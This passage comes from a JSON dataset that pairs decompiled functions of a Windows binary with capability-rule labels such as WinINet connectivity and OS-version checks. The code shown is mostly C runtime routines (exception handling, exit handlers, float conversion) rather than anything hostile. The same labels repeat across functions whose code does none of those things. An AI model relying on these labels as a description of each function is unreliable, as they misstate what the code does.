(*0x4d2cd0 == 0) {\n        fcn.0040e3f5(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 881
    },
    "0040caaa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040caaa(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0d8(0x421b08, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.0040dbcd();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040deef();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.0040df40(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040cb70();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040deef();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040f11d();\n    return;\n}\n",
        "token_count": 570
    },
    "0040cb70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040cb70(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040dbcd();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040dbcd();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040ce4b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ce4b(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00409d3f(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040dbcd();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040dbcd();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00409d18(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040cbd0(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "004110b9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004111ac: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004111b1)\n// WARNING: Removing unreachable block (ram,0x004111df)\n// WARNING: Removing unreachable block (ram,0x004111b7)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004110b9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0d8(0x421d58, 0x18);\n    fcn.0040e5e0(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4d2714 != 1) {\n        *0x4d2710 = 1;\n        *0x4d270c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040d981(*0x4d4208);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040d981(*0x4d4204);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040d978();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040d981(*piVar2);\n                        iVar3 = fcn.0040d978();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040d981(*0x4d4208);\n                        piVar1 = fcn.0040d981(*0x4d4204);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00410ff3(0x41d1e0);\n        }\n        fcn.00410ff3(0x41d1e8);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040e506(8);\n    }\n    return;\n}\n",
        "token_count": 811
    },
    "004130ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004130ea(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040e506(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00419360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419360(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00419861;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00419495;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0041949c;\ncode_r0x00419495:\n                        do {\n                            var_4h = 1;\ncode_r0x0041949c:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004194aa;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004194aa:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x441fd8 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x441fd8 < iVar12) {\n                if (iVar12 < *0x441fd4) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x441fd4;\n                    uVar5 = 1;\n                }\n                goto code_r0x00419861;\n            }\n            var_10h = *0x441fd8 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0041964d;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0041964d:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00419861:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3656
    },
    "004198a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004198a4(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00419da5;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x441ff4 - 1;\n        iVar4 = *0x441ff4 + (*0x441ff4 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x441ff4 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004199d9;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004199e0;\ncode_r0x004199d9:\n                        do {\n                            var_4h = 1;\ncode_r0x004199e0:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004199ee;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004199ee:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x441ff0 - *0x441ff4) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x441ff0 < iVar12) {\n                if (iVar12 < *0x441fec) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x442000;\n                    iVar4 = *0x441ff8 + (*0x441ff8 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x441ff8 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x441ff8 + (*0x441ff8 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x441ff8 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x442000 + *0x441fec;\n                    uVar5 = 1;\n                }\n                goto code_r0x00419da5;\n            }\n            var_10h = *0x441ff0 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x441ff4 - 1;\n            iVar12 = *0x441ff4 + (*0x441ff4 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x441ff4 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00419b91;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00419b91:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x441ff8 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 